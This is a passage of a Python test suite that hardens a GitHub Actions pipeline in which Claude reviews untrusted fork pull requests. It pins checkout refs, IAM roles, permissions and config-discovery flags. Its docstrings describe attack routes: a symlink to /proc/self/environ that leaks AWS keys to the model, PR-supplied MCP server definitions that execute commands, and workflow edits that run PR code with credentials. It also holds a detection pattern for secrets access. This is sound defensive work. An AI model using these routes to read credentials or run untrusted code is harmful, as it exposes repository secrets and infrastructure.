    test passed, because it greps YAML rather than the parser.

    And the empty form must not start working either: the action installs the
    `settings:` block — our three hooks — into ~/.claude/settings.json, the
    `user` source. `[]` would disable restrict-write.sh, the only fence on the
    bare `Write` grant. `user` is the single value that excludes the PR tree and
    keeps the hooks.
    """

    @staticmethod
    def _claude_args() -> str:
        """Just the block scalar — prompt prose must not be able to satisfy these."""
        review = strip_comments(job_block(STAGE2.read_text(), "review"))
        body = review.split("claude_args: |", 1)
        assert len(body) == 2, "premise changed: no claude_args block"
        return body[1].split("\n          prompt:", 1)[0]

    def test_review_step_scopes_setting_sources_to_user(self):
        args = self._claude_args()
        self.assertRegex(
            args,
            r"--setting-sources\s+user(\s|$)",
            "review job no longer scopes setting discovery to `user`",
        )
        self.assertEqual(
            len(re.findall(r"--setting-sources", args)),
            1,
            "more than one --setting-sources: a later one silently wins",
        )

    def test_the_empty_form_the_action_ignores_is_not_used(self):
        args = self._claude_args()
        self.assertNotRegex(
            args,
            r'--setting-sources[\s=]+""',
            "the empty form parses to a boolean and re-enables project/local",
        )

    def test_only_one_add_dir_because_the_flag_does_not_accumulate(self):
        # `add-dir` is absent from the action's ACCUMULATING_FLAGS, so a second
        # occurrence overwrites the first instead of adding to it. A review
        # silently loses the directory it writes its verdict into.
        args = self._claude_args()
        self.assertEqual(
            len(re.findall(r"--add-dir", args)),
            1,
            "more than one --add-dir: this action keeps only the last",
        )
        self.assertRegex(args, r"--add-dir\s+\$\{\{\s*runner\.temp\s*\}\}")


class TestTheFindingsPathIsPinned(unittest.TestCase):
    """The tool rule, the prompt and the hook must name one findings path.

    The workflow step that claims to check this compares two values it declares
    itself. Nothing compared the literal inside `--allowedTools`, which is the
    one an edit would actually drift.
    """

    def setUp(self):
        self.review = strip_comments(job_block(STAGE2.read_text(), "review"))

    # One expected value, and every site that must carry it named explicitly.
    # A regex over "whatever follows runner.temp" cannot see the drift that
    # matters: retargeting the prompt to `...findings.txt`, or the hook env to
    # `nested/...findings.json`, stops matching and so stops being checked,
    # while the remaining references keep any aggregate assertion green.
    EXPECTED = "${{ runner.temp }}/pr-review-findings.json"

    def test_the_read_grant_names_the_findings_file(self):
        self.assertIn(f"Read(/{self.EXPECTED})", self.review)

    def test_the_prompt_tells_the_model_to_write_that_exact_path(self):
        # WHOLE-TOKEN, not `assertIn`: a containment check takes the expected
        # path as a PREFIX, so retargeting the prompt to `...findings.jsonl`
        # passed while directing a write the hook then refuses.
        prompt = self.review.split("prompt: |", 1)[1]
        output = prompt.split("OUTPUT.", 1)
        self.assertEqual(len(output), 2, "premise changed: no OUTPUT section")
        section = output[1].split("\n\n", 1)[0]
        targets = [
            t.rstrip(".,") for t in re.findall(r"\$\{\{ runner\.temp \}\}/\S+", section)
        ]
        self.assertEqual(
            targets,
            [self.EXPECTED],
            f"the prompt names a different verdict path: {targets}",
        )

    def test_every_env_var_that_names_it_is_present_and_agrees(self):
        # Presence asserted FIRST. Iterating matches alone made DELETING a
        # binding pass vacuously, after which the hooks fall back to their own
        # /tmp default and silently disagree with the prompt.
        for var in ("FINDINGS_FILE", "PR_REVIEW_FINDINGS_FILE"):
            values = env_values(self.review, var)
            self.assertTrue(values, f"{var} is no longer set in the review job")
            for value in values:
                self.assertEqual(value, self.EXPECTED, f"{var} drifted to {value!r}")

    def test_the_hooks_default_agrees_with_the_workflow(self):
        # The hook falls back to its own literal when the env var is unset, and
        # the executable tests override that var — so nothing compared it.
        self.assertIn("pr-review-findings.json", HOOK.read_text())

    def test_the_grant_is_read_not_write(self):
        # `Write` is deliberately bare and fenced by the hook; the findings file
        # carries a READ grant so the model can re-read what it wrote.
        self.assertIn("Read(/${{ runner.temp }}/pr-review-findings.json)", self.review)


class TestNoWorkflowSetsAnUnmodelledEnvironmentName(unittest.TestCase):
    """The one `env:` entry that disarms every other guard in this file.

    All three files, because the hazard is the same in each: in Stage 2 it
    no-ops the symlink scrub, in Stage 1 it no-ops the capture, and in the suite
    CI it makes the contracts themselves advisory. Covered here rather than at
    each call site so a workflow added later is covered by the loop.
    """

    # Stage 1 keeps its own, narrower list on
    # `TestStage1RunsNoPullRequestContent.ALLOWED_ENV_KEYS`; that test is the
    # one that owns Stage 1's surface, and this loop uses it rather than a
    # second copy that could drift from it.
    STAGE2_ENV_KEYS = frozenset(
        (
            "AWS_REGION",
            "BASE_SHA",
            "CLAUDE_OUTCOME",
            "DONE_LABEL",
            "EFFECTIVE_STATUS",
            "EVENT_HEAD_BRANCH",
            "EVENT_HEAD_REPO",
            "EVENT_HEAD_SHA",
            "EXECUTION_FILE",
            "FINDINGS_FILE",
            "GH_TOKEN",
            "HARNESS",
            "HARNESS_VERSION",
            "HEAD_SHA",
            "IS_FORK",
            "MAX_CHANGED_FILES",
            "MAX_DIFF_BYTES",
            "MERGE_BASE_SHA",
            "PROMPT_HASH",
            "PR_DIR",
            "PR_NUMBER",
            "PR_REVIEW_DIFF_FILE",
            "PR_REVIEW_FILES_FILE",
            "PR_REVIEW_FINDINGS_FILE",
            "PR_REVIEW_HOOK_LOG",
            "PR_REVIEW_SCRIPTS_DIR",
            "PUBLISHER_ROLE",
            "REPO",
            "REVIEWED_SHA",
            "REVIEW_LABEL",
            "REVIEW_MODEL",
            "REVIEW_RESULT",
            "REVIEW_ROLE",
            "RUN_ID",
            "S3_BUCKET",
            "S3_PREFIX",
            "TOO_LARGE",
            "TRIGGERING_WORKFLOW_PATH",
            "TRIGGER_EVENT",
            "TRIGGER_LABEL",
            "TRIGGER_RUN_ID",
            "TRUSTED_SHA",
        )
    )

    def test_no_unmodelled_environment_name_is_set_anywhere(self):
        allowed = {
            STAGE1: TestStage1RunsNoPullRequestContent.ALLOWED_ENV_KEYS,
            STAGE2: self.STAGE2_ENV_KEYS,
            # The suite CI job needs no environment at all, and an entry there
            # would reach both the preflight and the discovery run.
            SUITE_CI: frozenset(),
        }
        for path, names in allowed.items():
            with self.subTest(workflow=path.name):
                refuse_unsafe_env_keys(self, path.read_text(), path.name, names)

    # Names whose VALUE decides which tree a trusted program reads. Being on
    # the allowlist above says only that the variable is expected; it says
    # nothing about where it points, and `PR_REVIEW_SCRIPTS_DIR:
    # ${{ github.workspace }}/pr/scripts/pr_review` makes the trusted
    # validation hook run PR-authored Python with the review job's AWS
    # session — every one of the 328 tests green. Measured.
    PINNED_ENV_VALUES = {
        "PR_REVIEW_SCRIPTS_DIR": "${{ github.workspace }}/trusted/scripts/pr_review",
        "PR_DIR": "${{ github.workspace }}/pr",
    }

    def test_every_path_valued_variable_points_into_the_tree_it_names(self):
        text = strip_comments(STAGE2.read_text())
        for name, expected in self.PINNED_ENV_VALUES.items():
            with self.subTest(variable=name):
                # ...AND THROUGH `norm_expr`, like every other expression
                # compared in this file: `${{github.workspace}}` resolves
                # identically and is not a drift.
                seen = env_values(text, name)
                self.assertEqual(
                    seen,
                    [expected],
                    f"{name} is {seen}, not [{expected!r}]. Its value selects "
                    "which checkout a trusted program reads; pointing it at "
                    "`pr/` runs the pull request's own code.",
                )

    def test_all_three_workflows_are_written_in_the_readable_subset(self):
        """The grammar Stage 1 has had since round 5, on the other two files.

        Round 8 closed four defects that were all one shape — a flow mapping or
        a bare list marker somewhere no line-oriented reader models — and every
        one was in Stage 2 or the suite CI. Stage 1, which this already
        covered, produced none. A grammar on one of three files is not a
        grammar, so it is applied to all three here and the Stage 1 test now
        calls the same function.
        """
        for path in (STAGE1, STAGE2, SUITE_CI):
            with self.subTest(workflow=path.name):
                refuse_unmodelled_spellings(
                    self, strip_comments(path.read_text()), path.name
                )


class TestBothReviewCheckoutsStayOutOfTheWorkspaceRoot(unittest.TestCase):
    """`path:` on both checkouts is what keeps PR config undiscoverable.

    Two separate controls depend on the workspace root staying empty. Project
    and local setting discovery resolve against the action's cwd, which is
    $GITHUB_WORKSPACE; and claude-code-action's agent mode runs
    `configureGitAuth` unconditionally, which would write a token into a
    .git/config at that root — the file `persist-credentials: false` exists to
    prevent. Today both throw or find nothing because the root is not a
    checkout. Losing either `path:` is a one-token edit that changes nothing
    observable in a passing run.
    """

    def test_every_checkout_in_the_review_job_declares_a_path(self):
        # BY WHAT THE STEP RUNS. `"actions/checkout@" in s` also selects a
        # step whose NAME or inline comment merely mentions the action — a red
        # on a rename that changes nothing — and MISSES a step whose `uses:` was
        # swapped for another action while the mention stayed.
        review = job_block(STAGE2.read_text(), "review")
        checkouts = steps_using(review, "actions/checkout")
        self.assertEqual(len(checkouts), 2, "premise changed: not two checkouts")
        for step in checkouts:
            # SINGLE LINE, and the value may be empty. `\s+` after `path:`
            # crosses newlines, so a valueless `path:` captured the next line's
            # key and a `path: # why` captured the `#` — both pass a
            # non-emptiness check while leaving the input unset, which is the
            # workspace-root checkout this test exists to forbid.
            # THE `with:` MAPPING, not the step: `path:` under `env:` is not an
            # action input, and the checkout would land at the workspace root.
            lines = with_block(step)
            pat = _key_re("path")  # quoted key and space-before-colon too
            hit = next(
                ((i, m) for i, ln in enumerate(lines) if (m := pat.match(ln))), None
            )
            self.assertIsNotNone(
                hit,
                f"a review-job checkout declares no path: {step[:60]!r}",
            )
            i, m = hit
            value = plain_scalar(m.group(1))
            self.assertNotEqual(
                value,
                "",
                f"a review-job checkout declares an EMPTY path: {step[:60]!r}",
            )
            # A bare block header (`path: |`) with no body is an EMPTY string
            # to YAML, while the literal `|` normalizes to a plausible-looking
            # directory name — so read the body when there is a header, rather
            # than rejecting the header outright (which reds the legal
            # `path: |-` followed by an indented `trusted`).
            #
            # The body STOPS AT THE FIRST DEDENT. Scanning the rest of the step
            # for any deeper-indented line walks past the scalar into a later
            # comment, which then stands in as the path.
            if BLOCK_HEADER.fullmatch(value):
                indent = len(lines[i]) - len(lines[i].lstrip())
                body = []
                for nxt in lines[i + 1 :]:
                    if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= indent:
                        break
                    if nxt.strip():
                        body.append(nxt.strip())
                value = body[0] if body else ""
                self.assertNotEqual(
                    value,
                    "",
                    "a review-job checkout's path is an empty block scalar; "
                    "YAML resolves that to an empty path and the checkout "
                    "lands at the workspace root",
                )
            # posixpath.normpath, not a trailing-slash strip: `././` survived
            # that as `./.` and still resolves to the workspace root.
            declared = posixpath.normpath(value)
            self.assertNotIn(
                declared,
                {"", "."},
                "this path IS the workspace root; the checkout must land beside it",
            )

    def test_review_step_keeps_mcp_config_strict(self):
        """`.mcp.json` is the OTHER discovery channel, closed by a DIFFERENT flag.

        `--setting-sources ""` does not cover it. Dropping `--strict-mcp-config`
        reopens `pr/.mcp.json`, which is a server definition and therefore
        command execution.
        """
        args = strip_comments(job_block(STAGE2.read_text(), "review"))
        self.assertIn("--strict-mcp-config", args)

    def test_escaping_symlinks_are_removed_before_the_model_runs(self):
        """Path-scoped Read matches the PATH, not where it RESOLVES.

        Without this step a fork commits `pr/leak -> /proc/self/environ`, the
        read is inside the allowed glob, and the step's AWS session key, secret
        and token are handed to the model. Verified live against CLI 2.1.201.
        """
        review = job_block(STAGE2.read_text(), "review")
        names = re.findall(r"^\s*- name: (.+)$", review, re.M)
        self.assertIn("Remove symlinks that escape the PR tree", names)
        idx = {n: i for i, n in enumerate(names)}
        self.assertLess(
            idx["Remove symlinks that escape the PR tree"],
            idx["Run the PR review"],
            "symlink removal must run BEFORE the model does",
        )
        self.assertIn(
            "-type l", strip_comments(review), "the step no longer looks for symlinks"
        )

    def test_no_step_deletes_agent_config_from_the_pr_tree(self):
        """Deleting agent config out of `pr/` mutates the tree under review.

        A PR whose actual change is to `CLAUDE.md` would then be reviewed with
        that change removed. Symlink removal above is deliberately narrower: it
        touches only links resolving OUTSIDE `pr/`, so it cannot alter a file
        the diff contains.
        """
        review = strip_comments(job_block(STAGE2.read_text(), "review"))
        self.assertNotIn("CONFIG_NAMES", review, "the agent-config scrub is back")
        self.assertNotIn(
            "rm -rf", review, "a step recursively deletes from the reviewed tree"
        )


class TestEachReviewCheckoutFetchesTheCommitItNames(unittest.TestCase):
    """`path:` says where a checkout LANDS; `ref:` says WHOSE CODE it holds.

    Every other control that tells the two checkouts apart keys off `path:` —
    the symlink scrub's PR_DIR, the model's Read grants, PR_REVIEW_SCRIPTS_DIR,
    the hook commands. All of them stay green if `trusted/` is filled from the
    pull request's head instead of the trusted commit, and the job then runs
    PR-authored hooks, the sanitizer and the row emitter inside the step that
    holds the review job's AWS session. The whole trusted/untrusted split rests
    on that one `ref: ${{ github.sha }}`, and nothing read it: changing it alone
    left the suite green. Measured.

    Read as VALUES and compared as an exact mapping per checkout, so a second
    `ref:`, an inline comment, or an `allow-unsafe-pr-checkout:` added to the
    trusted side cannot satisfy it.
    """

    # The WHOLE `with:` mapping of each checkout, not a chosen subset, because
    # an input nobody modelled changes the same things these do: `repository:`
    # picks another repo, `token:` another identity, `sparse-checkout:` another
    # subset of the tree, `submodules: recursive` fetches code the diff does not
    # show. Adding an input here is a deliberate edit to this literal, which is
    # the point — an unmodelled one is refused rather than reasoned about.
    EXPECTED = {
        "trusted": {
            "ref": "${{ github.sha }}",
            "fetch-depth": "1",
            "path": "trusted",
            "persist-credentials": "false",
        },
        "pr": {
            "ref": "${{ needs.prepare.outputs.head_sha }}",
            "fetch-depth": "1",
            "path": "pr",
            "persist-credentials": "false",
            "submodules": "false",
            "lfs": "false",
            # What lets actions/checkout fetch fork code in a `workflow_run`
            # job. Its ABSENCE from the trusted checkout above is as
            # load-bearing as its presence here.
            "allow-unsafe-pr-checkout": "true",
        },
    }

    def test_each_checkout_declares_exactly_the_inputs_its_role_requires(self):
        # The splitter assumes steps at six spaces, as every other step reader
        # in this file does. A reindented step sequence yields NO steps and
        # reds on the count below rather than passing vacuously.
        self.assertEqual(
            review_checkouts(),
            self.EXPECTED,
            "a review-job checkout no longer fetches what its role requires. "
            "`trusted/` must hold this repo's commit and `pr/` the "
            "authenticated PR head; swapping them, or adding an input that "
            "redirects either, runs pull-request code as the trusted half of "
            "the job.",
        )


class TestEveryStageTwoJobChecksOutWhatItsRoleAllows(unittest.TestCase):
    """The review job's two checkouts were pinned. Stage 2 has FOUR.

    `prepare` and `publish` each check this repository out at the workspace
    root and then run `scripts/pr_review/emit_row.py` from it — `prepare` with
    GITHUB_TOKEN and the publisher AWS session, `publish` with those plus
    `issues: write` and `pull-requests: write`. Pointing either `ref:` at the
    pull request's head is one token, and runs pull-request-authored Python
    with all of it. It is the same mutation the review job's trusted checkout
    is already pinned against, one job over, where nothing looked.

    Every checkout in the file is enumerated, so a fifth one cannot be added
    unnoticed either.
    """

    # (job, path) -> the `ref:` that checkout must fetch. `None` for `path:`
    # means the checkout lands on the workspace root, which is legitimate in
    # the two jobs that never fetch pull-request code and forbidden in `review`
    # (see TestBothReviewCheckoutsStayOutOfTheWorkspaceRoot).
    EXPECTED = {
        ("prepare", None): "${{ github.sha }}",
        ("review", "trusted"): "${{ github.sha }}",
        ("review", "pr"): "${{ needs.prepare.outputs.head_sha }}",
        ("publish", None): "${{ github.sha }}",
    }

    def test_no_job_checks_out_pull_request_code_it_is_not_allowed_to(self):
        text = STAGE2.read_text()
        seen = {}
        for job in ("prepare", "review", "publish"):
            for step in steps_using(job_block(text, job), "actions/checkout"):
                inputs = mapping_items(with_block(step))
                key = (job, inputs.get("path"))
                self.assertNotIn(key, seen, f"two checkouts in {job} on {key[1]!r}")
                seen[key] = inputs.get("ref")
        self.assertEqual(
            seen,
            self.EXPECTED,
            "a Stage 2 checkout no longer fetches the commit its job is "
            "allowed to run. Only `review` may fetch the pull request, and "
            "only into `pr/`, which nothing executes.",
        )

    def test_the_verdict_is_sanitized_by_the_trusted_copy_of_the_script(self):
        """`trusted/` here is a control, not a path that reads like one.

        `PR_REVIEW_SCRIPTS_DIR` and `PR_DIR` are pinned precisely because their
        values select which checkout a trusted program reads. This literal is
        the third such selector and nothing read it: `python3
        pr/scripts/pr_review/extract_verdict.py` runs the pull request's own
        sanitizer, with the review job's AWS session, over the output `publish`
        then treats as sanitized. One token, and it reads like a typo next to
        the unprefixed `scripts/pr_review/emit_row.py` two jobs away.
        """
        review = strip_comments(job_block(STAGE2.read_text(), "review"))
        runs = re.findall(r"python3 (\S*scripts/pr_review/\S+\.py)", review)
        self.assertTrue(
            runs, "premise changed: the review job runs no pr_review script"
        )
        self.assertEqual(
            sorted(set(runs)),
            ["trusted/scripts/pr_review/extract_verdict.py"],
            f"the review job runs {sorted(set(runs))}; every program it "
            "executes must come from the trusted checkout.",
        )

    def test_neither_stage_declares_a_workflow_level_collapse_group(self):
        """The defect TestStage1CollapseGroupIsJobLevel exists for, on the
        OTHER file, where it is worse.

        GitHub claims a workflow-level group before evaluating a job's `if:`,
        so a run the workflow is going to skip still joins it. Stage 2 receives
        a `workflow_run` completion for EVERY Stage 1 run, including the ones
        `prepare` refuses — so one group at column 0 lets a refused run cancel
        a review already in flight. Stage 1 is pinned against this; Stage 2 was
        not, and the reasoning transfers word for word.
        """
        for path in (STAGE1, STAGE2):
            with self.subTest(workflow=path.name):
                self.assertIsNone(
                    re.search(r"(?m)^[\"']?concurrency[\"']?[ \t]*:", path.read_text()),
                    f"{path.name} declares a workflow-level concurrency group; "
                    "a run its jobs would refuse still joins it, and cancels "
                    "whatever is already there.",
                )

    def test_each_job_holds_exactly_the_permissions_it_was_reviewed_with(self):
        """One key was pinned on one job; the rest of the surface was open.

        `pull-requests` had to be `read` on `prepare`, and `review` had to hold
        no PR scope. Nothing bounded the other scopes on any job, so `contents:
        write` and `issues: write` could be added to `prepare` — the job that
        holds GITHUB_TOKEN and the publisher session — with the suite green.
        """
        text = STAGE2.read_text()
        self.assertEqual(
            {
                job: mapping_items(indented_block(job_block(text, job), "permissions:"))
                for job in ("prepare", "review", "publish")
            },
            {
                "prepare": {
                    "actions": "read",
                    "contents": "read",
                    "pull-requests": "read",
                    "id-token": "write",
                },
                "review": {"contents": "read", "id-token": "write"},
                "publish": {
                    "issues": "write",
                    "pull-requests": "write",
                    "contents": "read",
                    "id-token": "write",
                },
            },
            "a Stage 2 job's token scopes are not the ones this design was "
            "reviewed with. Widening one is a deliberate edit to this literal.",
        )


class TestForkCheckoutPreconditionsHold(unittest.TestCase):
    """`allow-unsafe-pr-checkout: true` is only safe while four things stay true.

    actions/checkout refuses fork code in a `workflow_run` workflow because such
    a job carries the base repo's secrets, GITHUB_TOKEN, default-branch cache
    scope and runner access. We opted in on 2026-09-11 after checking each
    against the review job. The comment beside that line records the reasoning;
    these assertions are what stop the reasoning going stale, because every one
    of the four is a property a later edit could quietly remove.

    This is deliberately about the REVIEW job only. prepare and publish never
    execute pull-request content, so the guard's premise does not apply to them.
    """

    def setUp(self):
        self.review = job_block(STAGE2.read_text(), "review")
        self.code = strip_comments(self.review)

    def test_opt_in_is_present_and_on_the_untrusted_checkout(self):
        """Without it, fork PRs fail at checkout and no review ever runs.

        Read through `review_checkouts()` rather than by splitting the job text
        on the literal `path: pr`: that split reds on `path: "pr"`, a quoting
        change YAML reads identically, and it takes whatever follows the match
        rather than the step's own `with:` mapping.
        """
        seen = review_checkouts()["pr"].get("allow-unsafe-pr-checkout")
        self.assertEqual(
            seen,
            "true",
            f"the checkout that fetches PR code declares "
            f"allow-unsafe-pr-checkout {seen!r}, not 'true'; fork pull "
            "requests fail at checkout and no review ever runs.",
        )

    def test_review_job_uses_no_secrets(self):
        """A secret here would be readable by a process running fork code."""
        # THE WHOLE CONTEXT, not one spelling of one key. Enumerating spellings
        # lost twice: a dot-only pattern saw neither `secrets['X']` nor
        # `secrets["X"]`, and a `secrets`-only pattern could not see
        # `${{ github['token'] }}` — the same GITHUB_TOKEN under a different
        # context — which handed a live token to the process running fork code
        # with this test green. Expression syntax keeps supplying more:
        # `github[format('to{0}','ken')]` builds the key at runtime, and
        # `toJSON(github)` / `toJSON(secrets)` serialise the whole thing.
        #
        # So the rule is by NEED, not by spelling: this job needs no GitHub
        # credential, so `secrets` in any form, ANY index into `github`, and any
        # `toJSON` are refused outright. Dotted `github.` reads stay legal
        # because the job genuinely uses `github.workspace` and
        # `github.repository` — except `.token`, which is the credential.
        #
        # CASE-INSENSITIVE, because Actions expression names are:
        # `${{ github.TOKEN }}` and `${{ tojson(secrets) }}` resolve exactly as
        # the lower-case spellings do.
        #
        # SCANNED WITH THE NEWLINES COLLAPSED as well as line by line, because a
        # folded scalar can put `${{ github.` on one content line and `token }}`
        # on the next: Actions joins them, and neither line on its own carries
        # the whole access.
        #
        # This is about GitHub credentials only. The job DOES hold an AWS
        # session — it assumes REVIEW_ROLE deliberately, and that role's narrow
        # scope is what TestReviewRoleSeparationIsPinned exists for.
        pattern = r"\bsecrets\b|github\s*\[|github\s*\.\s*token|\btoJSON\b"
        offenders = [
            ln.strip() for ln in self.code.splitlines() if re.search(pattern, ln, re.I)
        ]
        folded = re.search(pattern, " ".join(self.code.split()), re.I)
        self.assertEqual(
            offenders,
            [],
            f"the review job names a GitHub credential, or a context that "
            f"carries one ({offenders}); the process running pull-request code "
            "can read anything this job is handed.",
        )
        self.assertIsNone(
            folded,
            f"the review job names a GitHub credential across a line break "
            f"({folded.group(0) if folded else ''!r})",
        )

    def test_review_job_caches_nothing(self):
        """Cache writes land in the default-branch scope — poisonable from a fork."""
        self.assertNotIn("actions/cache", self.code)
        self.assertNotIn("cache:", self.code)

    def test_review_job_runs_on_an_ephemeral_github_runner(self):
        """A self-hosted runner would give fork code a persistent host."""
        runners = re.findall(r"runs-on:\s*(\S+)", self.code)
        self.assertEqual(runners, ["ubuntu-latest"], f"runner changed: {runners}")

    def test_untrusted_checkout_does_not_persist_credentials(self):
        """Otherwise the token lands in pr/.git/config, which the model may read.

        THE VALUE, not the substring. `strip_comments` drops whole-line
        comments only, so `persist-credentials: true # persist-credentials:
        false` satisfied a containment check while the checkout wrote the job's
        token into `pr/.git/config` — a file inside the model's Read grant.
        Same treatment `egress-policy` and `disable-sudo` got, and read through
        the same checkout reader as the opt-in above.
        """
        seen = review_checkouts()["pr"].get("persist-credentials")
        self.assertEqual(
            seen,
            "false",
            f"the untrusted checkout's persist-credentials is {seen!r}, not "
            "'false'; the job's token lands in pr/.git/config, which the "
            "model is allowed to read.",
        )


class TestReviewRoleSeparationIsPinned(unittest.TestCase):
    """The review job's `environment:` and REVIEW_ROLE must stay one pair.

    The separation is real and it hangs
    entirely on these two lines agreeing. `gha_workflow_claude_untrusted`
    trusts `sub` values of the form `…:environment:claude-untrusted` (this repo
    and pytorch/pytorch), and GitHub mints such a subject only for a job that
    DECLARES that environment.

    Two distinct half-edits, with different consequences:

    * `environment: bedrock` + the untrusted role. The configured assume fails
      loudly — the role does not trust the publisher's subject. But the job's
      TOKEN is again eligible for the publisher role, so code running in the
      job could request credentials for it explicitly. Loud in the happy path,
      and a real widening in the adversarial one.
    * `environment: bedrock` + the shared role — i.e. reverting both together
      to the old interim state. Nothing fails; the untrusted job silently
      regains PutObject on `pr_review_verdicts/`, the forgery path this design
      exists to remove. This is the dangerous one, and asserting the exact
      expected pair below is what catches it.

    Dropping the environment line entirely fails closed and is merely broken.

    The denials were verified end-to-end in pytorch/ciforge, where this originated.
    """

    EXPECTED_ENV = "claude-untrusted"
    EXPECTED_ROLE = "arn:aws:iam::308535385114:role/gha_workflow_claude_untrusted"
    SHARED_ROLE = "arn:aws:iam::308535385114:role/gha_workflow_claude_code"

    def setUp(self):
        self.text = STAGE2.read_text()
        self.review = strip_comments(job_block(self.text, "review"))
        # EVERY definition, not `re.search`'s first. The first match is always
        # the workflow-level one, so a job-level `env: REVIEW_ROLE: <other>`
        # inside `review` — which is the binding that would actually apply —
        # was invisible to every assertion below.
        roles = env_values(strip_comments(self.text), "REVIEW_ROLE")
        self.assertEqual(
            len(roles),
            1,
            f"REVIEW_ROLE is defined {len(roles)} times ({roles}); the "
            "innermost wins and the tests below read only one.",
        )
        self.review_role = roles[0]
        envs = env_values(self.review, "environment")
        self.review_env = envs[0] if len(envs) == 1 else None

    def test_review_role_is_the_untrusted_role(self):
        self.assertEqual(
            self.review_role,
            self.EXPECTED_ROLE,
            "the review job must assume the untrusted role; the shared role "
            "carries PutObject on every ossci-raw-job-status prefix including "
            "pr_review_verdicts",
        )

    def test_review_job_declares_the_untrusted_environment(self):
        self.assertEqual(
            self.review_env,
            self.EXPECTED_ENV,
            "the review job must declare `environment: claude-untrusted` — that "
            "declaration is the only thing that mints the OIDC `sub` the "
            "untrusted role's trust policy accepts",
        )

    def test_the_two_never_disagree(self):
        """The pairing, asserted as a pair so a half-edit cannot pass."""
        self.assertEqual(
            (self.review_env, self.review_role),
            (self.EXPECTED_ENV, self.EXPECTED_ROLE),
            "the review job's `environment:` and REVIEW_ROLE must flip together",
        )

    def test_review_job_never_names_the_publisher_environment(self):
        """`environment: bedrock` here would hand the untrusted job the publisher's sub."""
        self.assertIsNone(
            re.search(r"^\s*environment:\s*bedrock\s*$", self.review, re.M),
            "the review job declares the publisher's environment",
        )

    def test_review_job_never_names_the_shared_role(self):
        self.assertNotIn(self.SHARED_ROLE, self.review)

    def test_review_job_assumes_review_role_indirectly(self):
        # THE VALUE, AND THE ACTION'S INPUT. `role-to-assume: ${{
        # env.PUBLISHER_ROLE }} # role-to-assume: ${{ env.REVIEW_ROLE }}`
        # satisfies a containment check while the job that runs pull-request
        # code assumes the publisher role — the silent widening this class's
        # docstring calls the dangerous one. So does the expected value written
        # under the step's `env:` beside a different real input, which is why
        # this reads the `with:` mapping rather than scanning the job.
        #
        # WHAT THE REFERENCE RESOLVES TO is `setUp`'s business: it requires
        # `REVIEW_ROLE` to be defined exactly once in the whole file, so a
        # step-level `env: REVIEW_ROLE: ${{ env.PUBLISHER_ROLE }}` beneath this
        # very input cannot redirect it.
        steps = steps_using(self.review, "aws-actions/configure-aws-credentials")
        self.assertEqual(len(steps), 1, f"review job role assumptions: {len(steps)}")
        seen = mapping_items(with_block(steps[0])).get("role-to-assume")
        self.assertEqual(
            seen,
            "${{ env.REVIEW_ROLE }}",
            f"the review job assumes {seen!r}, not the untrusted role; that is "
            "PutObject on pr_review_verdicts/ for the job running PR code.",
        )


class TestStage1CollapseGroupIsJobLevel(unittest.TestCase):
    """A WORKFLOW-level group on Stage 1 lets an ignored run cancel a real one.

    GitHub claims a workflow-level concurrency group BEFORE evaluating the job
    `if:`, so a run this workflow is going to skip still joins the group and,
    with `cancel-in-progress`, kills a review already in flight.

    THERE USED TO BE ONE HERE, suffixed with `github.event.label.name`, and the
    suffix was believed to defuse it. It does not: three of the four declared
    trigger types carry no label object, so the suffix renders EMPTY and they
    share one group. A `synchronize` the `if:` rejects — the PR went draft, or
    picked up the terminal label — lands in the same group as a `synchronize`
    that is mid-review and cancels it, then skips its own `capture`. The
    cancelled run never reaches `conclusion == 'success'`, so Stage 2 does not
    fire: no review, no telemetry row, nothing on the PR. Measured in
    pytorch/ciforge as the CLA-bot variant of the same thing, and reachable here
    with a single trigger and no stale file anywhere.

    So the group lives on `capture`, which a rejected run never enters, and the
    workflow level carries none. `.github/scripts/ensure_actions_will_cancel.py`
    is the reason one was kept after the ciforge incident; it selects files with
    `"pull_request" in on`, an exact key match, so this file left its scope when
    the trigger moved and the checker exits 0 without it.
    """

    def setUp(self):
        self.text = STAGE1.read_text()

    def test_there_is_no_workflow_level_group_at_all(self):
        """THE KEY, not the cancellation. Both narrowings were measured wrong.

        An earlier version forbade only `cancel-in-progress: true`, on the
        reasoning that a non-cancelling group is harmless. It is not: GitHub
        cancels a PENDING run when another enters the same group, so with A
        running and an eligible B pending, a rejected C entering the group
        cancels B before C's own job condition is evaluated. And `true` has
        spellings — `True`, `'true'`, `${{ … }}` — each of which a value regex
        misses while restoring the defect in full.

        Nothing here needs a workflow-level group, so the whole key goes.
        """
        self.assertIsNone(
            re.search(
                r"(?m)^[\"\']?concurrency[\"\']?[ \t]*:", strip_comments(self.text)
            ),
            "Stage 1 declares a workflow-level `concurrency:` again. It is "
            "claimed before the job `if:`, so a run this workflow SKIPS joins "
            "it and can cancel — or displace as pending — a review in flight. "
            "No suffix fixes that: three of the four declared trigger types "
            "carry no label to differentiate by. The collapse group belongs on "
            "the `capture` job, which a rejected run never enters.",
        )

    def test_capture_job_keeps_a_collapse_group(self):
        """The group must not be dropped either — bursts should still collapse."""
        block = strip_comments(job_block(self.text, "capture"))
        # re.M matters: assertRegex uses re.search, so a bare `^` would only
        # anchor at the start of the whole block and never match the indented key.
        self.assertIsNotNone(
            re.search(r"^\s+concurrency:", block, re.M),
            "capture lost its concurrency group",
        )
        # THE VALUE, AND AS AN ENTRY OF `concurrency:`. `cancel-in-progress:
        # false # cancel-in-progress: true` satisfies a containment check while
        # bursts stop collapsing — and so does the same text indented inside a
        # `group: |` block scalar, where Actions reads it as part of the group
        # NAME and cancellation quietly defaults to false.
        conc = mapping_items(indented_block(block, "concurrency:"))
        self.assertEqual(
            conc.get("cancel-in-progress"),
            "true",
            f"capture's concurrency is {conc}; cancel-in-progress must be true",
        )

    def test_the_capture_group_is_keyed_by_event(self):
        """A constant under one trigger, and the reason to keep it is the run
        this repository's tree cannot forbid.

        `pull_request` reads the workflow from the PULL REQUEST'S OWN REF. A PR
        that adds a copy of this file under this workflow's name therefore
        produces a second run, and no contract test can stop it — every one of
        them reads a single tree. Keyed by event the two take different groups;
        unkeyed, whichever starts second cancels the other, and if the survivor
        is the `pull_request` one Stage 2 refuses its event and the run ends
        `skipped`.

        NOT A FENCE AGAINST A DELIBERATE ONE, and two earlier versions of this
        docstring understated it by a step each. The PR authors that copy, so
        they author its group string, and the PR NUMBER in it is a literal
        bound to nothing — so an approved contributor can name someone ELSE'S
        pull request and cancel their capture. Cross-PR, and invisible: Stage 2
        needs `conclusion == 'success'`, so a cancelled capture leaves no row.
        A per-SHA check run makes that detectable, not impossible. The case
        this key actually covers is an HONEST PR-ref copy — someone iterating
